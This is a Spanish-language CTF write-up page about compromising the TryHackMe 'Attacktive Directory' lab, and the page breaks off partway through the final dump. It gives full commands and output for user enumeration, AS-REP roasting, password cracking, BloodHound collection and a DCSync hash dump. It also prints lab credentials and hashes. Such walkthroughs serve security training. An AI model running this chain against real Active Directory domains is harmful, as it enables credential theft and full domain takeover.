@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup TryHackMe Attacktive Directory</title>
+
+  <meta name="description" content="Resolución de la máquina Attacktive Directory de la plataforma de TryHackMe">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup TryHackMe Attacktive Directory">
+  <meta name="twitter:description" content="Resolución de la máquina Attacktive Directory de la plataforma de TryHackMe">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/attacktivedirectory.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup TryHackMe Attacktive Directory">
+  <meta property="og:description" content="Resolución de la máquina Attacktive Directory de la plataforma de TryHackMe">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/attacktivedirectory.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/attacktivedirectory.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackMe Attacktive Directory" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/thm" title="GatoGamer1155" class="blog-button">TryHackMe</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-svc-admin">Access - svc-admin</a></li>
+        <li><a href="#shell-backup">Shell - backup</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">TryHackMe</h2>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/th/attacktivedirectory.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Attacktive Directory</h2><br>
+  </header>
+
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente solo encontramos varios puertos abiertos, todos comunes en un <code class="language-plaintext highlighter-rouge">AD</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.227.11
+Nmap scan report for 10.10.227.11
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos hacer una petición a nivel de <code class="language-plaintext highlighter-rouge">SMB</code> donde ademas del nombre de la máquina encontramos el <code class="language-plaintext highlighter-rouge">dominio</code> al que se asocian los equipos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.227.11
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos <code class="language-plaintext highlighter-rouge">ataques</code> o simplemente comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que sepa a donde apuntar con el <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.227.11 spookysec.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listando los <code class="language-plaintext highlighter-rouge">recursos</code> compartidos en <code class="language-plaintext highlighter-rouge">SMB</code> sin credenciales no tenemos <code class="language-plaintext highlighter-rouge">permisos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient </span><span class="p">-N -L spookysec.local
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------  </span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-svc-admin">
+<br><h3 class="post-title">Access - svc-admin</h3><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">kerbrute</code> y un <a href="https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt">diccionario</a> de usuarios, podemos aplicar fuerza bruta para poder enumerar varios <code class="language-plaintext highlighter-rouge">usuarios</code> validos mediante <code class="language-plaintext highlighter-rouge">kerberos</code> a nivel de <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d spookysec.local --dc 10.10.227.11 userlist.txt  
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>       10.10.227.11:88
+</span><span class="ve">
+>  [+] VALID USERNAME:   james@spookysec.local
+>  [+] VALID USERNAME:   svc-admin@spookysec.local
+>  [+] VALID USERNAME:   robin@spookysec.local
+>  [+] VALID USERNAME:   darkstar@spookysec.local
+>  [+] VALID USERNAME:   administrator@spookysec.local
+>  [+] VALID USERNAME:   backup@spookysec.local
+>  [+] VALID USERNAME:   paradox@spookysec.local</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al final nos queda una lista de <code class="language-plaintext highlighter-rouge">usuarios</code> que sabemos son validos a en el <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">users.txt  
+james
+svc-admin
+robin
+darkstar
+administrator
+backup
+paradox</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos probar cada uno de los usuarios con <code class="language-plaintext highlighter-rouge">GetNPUsers</code> para aplicar un ataque <code class="language-plaintext highlighter-rouge">ASREPRoast</code>, al hacer este ataque el usuario <code class="language-plaintext highlighter-rouge">svc-admin</code> nos devuelve su <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">spookysec.local/ -no-pass -usersfile users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9a227e4081373316c5008e4603b75e3d$acd6f0343df9c2400ef546f400713135613050b8452622aa99471beaf0ce897fdbe4e2f7c2f9ae4533fa747ebd6b27811acf778e8f8695ce8ba4aeaa0593a5a1ca019cc277cff9708f11a228f941a770448b2e5757420bf28277c71d214981ec4af9f56d58084df250de891d9773091e8e14630785bbc75b63b5e5aa78999023571691478f559c38652883b3dea2ee73db6c692fb9580752a781a2866711d1c11921dca77ffd02e01b630bc5b6e49535ee97aae8b9fd45cc3098327dccb6fd35b02fc89fd16a909a288f24746a8dcfb465a11614a75909373974538360024cc9fb6531635cde06bb39cc4e249f0be071b8fc  
+[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este <code class="language-plaintext highlighter-rouge">hash</code> lo crackeamos con <code class="language-plaintext highlighter-rouge">john</code> y obtenemos su <code class="language-plaintext highlighter-rouge">contraseña</code> en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="ro">management2005</span><span class="p">   (</span><span class="ro">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar las <code class="language-plaintext highlighter-rouge">credenciales</code> a nivel de smb con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y son validas, ademas entre los <code class="language-plaintext highlighter-rouge">recursos</code> tenemos permiso de lectura en <code class="language-plaintext highlighter-rouge">backup</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb spookysec.local -u svc-admin -p management2005 --shares
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="ve">[+] </span><span class="p">spookysec.local\svc-admin:management2005 
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">backup          READ            
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-backup">
+<br><h3 class="post-title">Shell - backup</h3><br>
+
+<p class="plain-text">Nos conectamos al recurso smb <code class="language-plaintext highlighter-rouge">backup</code> con las credenciales de <code class="language-plaintext highlighter-rouge">svc-admin</code> y podemos ver solo un archivo <code class="language-plaintext highlighter-rouge">backup_credentials.txt</code> asi que lo descargamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">spookysec.local/svc-admin:management2005@10.10.227.11  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+backup
+C$
+IPC$
+NETLOGON
+SYSVOL
+# use backup
+# ls
+drw-rw-rw-          0  Sat Apr  4 15:08:39 2020 .
+drw-rw-rw-          0  Sat Apr  4 15:08:39 2020 ..
+-rw-rw-rw-         48  Sat Apr  4 15:08:53 2020 backup_credentials.txt
+# get backup_credentials.txt
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">txt</code> contiene una cadena que parece ser <code class="language-plaintext highlighter-rouge">base64</code>, basta con decodearlo con <code class="language-plaintext highlighter-rouge">-d</code> para encontrar las <code class="language-plaintext highlighter-rouge">credenciales</code> del usuario <code class="language-plaintext highlighter-rouge">backup</code> a nivel de dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">backup_credentials.txt
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw  
+
+</span><span class="ve">❯ cat </span><span class="p">backup_credentials.txt | </span><span class="ve">base64</span><span class="p"> -d  
+backup@spookysec.local:backup2517860</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y parese que son <code class="language-plaintext highlighter-rouge">validas</code> en el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb spookysec.local -u backup -p backup2517860
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.227.11    445    ATTACKTIVEDIREC  </span><span class="ve">[+] </span><span class="p">spookysec.local\backup:backup2517860</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En este caso los usuarios del <code class="language-plaintext highlighter-rouge">dominio</code> tienen el privilegio de poder conectarse por <code class="language-plaintext highlighter-rouge">RDP</code> a la máquina y obtener una interfaz grafica, nos conectamos con <code class="language-plaintext highlighter-rouge">xfreerdp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ xfreerdp </span><span class="p">/u:backup /p:backup2517860 /v:spookysec.local /cert:ignore /dynamic-resolution  </span>
+</code></pre></div></div><br>
+
+<a href="/thm/attacktivedirectory/1.png" target="_blank"><div><p><img src="/thm/attacktivedirectory/1.png"></p></div></a>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Para enumerar el <code class="language-plaintext highlighter-rouge">dominio</code> creamos un recurso smb compartiendo el <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde una <code class="language-plaintext highlighter-rouge">powershell</code> copiamos el archivo <code class="language-plaintext highlighter-rouge">ps1</code> y lo importamos en la máquina como <code class="language-plaintext highlighter-rouge">backup</code>, despues lo invocamos indicando el metodo de recolección <code class="language-plaintext highlighter-rouge">All</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Backup.THM-AD> </span><span class="am">cp</span><span class="p"> \\10.8.64.87\kali\SharpHound.ps1
+PS C:\Users\Backup.THM-AD> </span><span class="am">Import-Module</span><span class="p"> .\SharpHound.ps1
+PS C:\Users\Backup.THM-AD> </span><span class="am">Invoke-Bloodhound </span><span class="c1">-CollectionMethod </span><span class="p">All  
+PS C:\Users\Backup.THM-AD></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto nos dejara un <code class="language-plaintext highlighter-rouge">zip</code> con toda la información, lo copiamos nuestro recurso <code class="language-plaintext highlighter-rouge">smb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Backup.THM-AD> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\Backup.THM-AD
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         5/2/2023   9:40 PM                3D Objects
+d-r---         5/2/2023   9:40 PM                Contacts
+d-r---         5/2/2023   9:40 PM                Desktop
+d-r---         5/2/2023   9:40 PM                Documents
+d-r---         5/2/2023   9:40 PM                Downloads
+d-r---         5/2/2023   9:40 PM                Favorites
+d-r---         5/2/2023   9:40 PM                Links
+d-r---         5/2/2023   9:40 PM                Music
+d-r---         5/2/2023   9:40 PM                Pictures
+d-r---         5/2/2023   9:40 PM                Saved Games
+d-r---         5/2/2023   9:40 PM                Searches
+d-r---         5/2/2023   9:40 PM                Videos
+-a----         5/2/2023   9:36 PM          13050 20230502213603_BloodHound.zip
+-a----         5/2/2023   9:33 PM        1318097 SharpHound.ps1
+
+PS C:\Users\Backup.THM-AD> </span><span class="am">cp </span><span class="p">20230502213603_BloodHound.zip \\10.8.64.87\kali\BH.zip  
+PS C:\Users\Backup.THM-AD></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos el archivo <code class="language-plaintext highlighter-rouge">zip</code> a <code class="language-plaintext highlighter-rouge">bloodhound</code> y listando privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> vemos que el usuario <code class="language-plaintext highlighter-rouge">backup</code> tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el dominio <code class="language-plaintext highlighter-rouge">spookysec.local</code></p>
+<a href="/thm/attacktivedirectory/2.png" target="_blank"><div><p><img src="/thm/attacktivedirectory/2.png"></p></div></a>
+
+<p class="plain-text">Este <code class="language-plaintext highlighter-rouge">privilegio</code> deberia ser suficiente para con <code class="language-plaintext highlighter-rouge">secretsdump</code> como <code class="language-plaintext highlighter-rouge">backup</code> dumpear los <code class="language-plaintext highlighter-rouge">hashes</code> NT de los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio con el metodo <code class="language-plaintext highlighter-rouge">drsuapi</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">spookysec.local/backup:backup2517860@10.10.227.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:54b03e2c6066f337489ac1d6636e71b7:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
+krbtgt:des-cbc-md5:b94f97e97fabbf5d
+spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
+spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
+spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
+spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5  
+spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
+spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
+spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
+spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
+spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
+spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
+spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
+spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
+spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
+spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
+spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
+spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
+spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
+spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
+spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
+spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
+spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
+spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
+spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
+spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
+spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
+spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
+spookysec.local\paradox:des-cbc-md5:83988983f8b34019
+spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
+spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
+spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
+spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
+spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
+spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
+spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
+spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
+spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
+spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
+spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
+spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
+spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
+spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
+spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
+ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:e2fec5f5c1ba9eac49424fbcc726e73964081021b7efedaf9f29d62a9c6bc057
+ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:387135e8c44266e0a94ce9e19d811432
